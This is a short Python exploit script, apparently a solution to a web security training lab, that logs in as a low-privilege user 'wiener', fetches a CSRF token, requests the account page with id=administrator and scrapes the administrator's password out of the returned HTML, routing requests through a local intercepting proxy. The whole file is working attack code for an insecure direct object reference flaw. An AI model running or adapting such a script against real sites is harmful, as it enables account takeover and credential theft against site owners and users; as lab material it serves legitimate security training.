import requests as rs
import sys
import urllib3 
import re
from bs4 import BeautifulSoup as bs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}


def get_csrf_token(s,url):
    r = s.get(url,verify=False,proxies=proxies)
    soup = bs(r.text,'html.parser')
    csrf = soup.find('input',{'name':'csrf'})['value']
    csrf_tokens = {'csrf':csrf}
    sys.stdout.write("[+] CSRF Token : %s\n" % csrf)
    return csrf_tokens


def get_admin_pass(s,url):
    
    login_url = url + '/login'
    csrf_token = get_csrf_token(s,login_url)
    
    # login as wiener user
    sys.stdout.write("[+] Login as wiener user\n")
    data_login = {
        'csrf' : csrf_token['csrf'],
        'username' : 'wiener',
        'password' : 'peter'
    }

    r = s.post(login_url,data=data_login,verify=False,proxies=proxies)
    res = r.text
    if 'Log out' in res:
        sys.stdout.write("[+] Login successful\n")
        # admin password retrieving
        admin_account_url = url + "/my-account?id=administrator"
        r = s.get(admin_account_url,verify=False,proxies=proxies)
        resp = r.text
        
        if 'administrator' in resp:
            sys.stdout.write("[+] Administrator account accessed\n")
            sys.stdout.write("[+] Retrieving admin password\n")
            admin_password = re.findall(r"type=password name=password value='(.*?)'", resp)[0]
            sys.stdout.write("[+] Admin Password: %s\n" % admin_password)
        else:
            sys.stdout.write("[-] Administrator account not accessed\n")
            sys.exit(1)
    else:
        sys.stdout.write("[-] Login failed\n")
        sys.exit(1)
    
    



def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage: python3 %s <URL>\n" % sys.argv[0])
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]

    admin_pass = get_admin_pass(s,url)


    



if __name__ == '__main__':
    main()
